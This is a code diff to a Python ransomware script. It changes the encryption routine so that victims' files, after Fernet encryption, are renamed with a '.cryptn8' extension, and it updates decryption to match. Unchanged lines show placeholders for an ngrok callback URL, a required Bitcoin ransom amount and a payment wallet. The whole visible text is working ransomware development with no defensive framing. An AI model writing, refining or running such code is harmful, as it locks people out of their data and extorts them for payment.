@@ -13,6 +13,7 @@ fernetEncrypt = Fernet(key)
 decryptPlease = random.randint(100000, 999999)
 uniqueKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
 
+
 url = "YOUR_NGROK_URL_HERE"
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
@@ -63,17 +64,19 @@ def findFiles():
 def encrypt():
     for file in tqdm.tqdm(fileLists):
         flag = 0
+        newfile = str(file)+".cryptn8"
         try:
             with open(file, "rb") as f:
                 data = f.read()
                 encryptedData = fernetEncrypt.encrypt(data)
-                fileList.append(file)
         except:
             flag = 1
         if flag == 0:
             try:
                 with open (file, "wb") as f:
+                    fileList.append(file)
                     f.write(encryptedData)
+                os.rename(file, newfile)
             except:
                 a = "error" # just to fill the except block
 
@@ -94,15 +97,16 @@ def decrypt():
     for files in fileList:
         flag = 0
         try:
-            with open(files, "rb") as f:
+            with open(str(files)+".cryptn8", "rb") as f:
                 data = f.read()
         except:
             flag = 1
         if flag == 0:
             try:
-                with open(files, "wb") as f:
+                with open(str(files)+".cryptn8", "wb") as f:
                     decryptedData = fernetEncrypt.decrypt(data)
                     f.write(decryptedData)
+                os.rename(str(files)+".cryptn8", files)
             except:
                 a = "error" # just to fill the except block
         
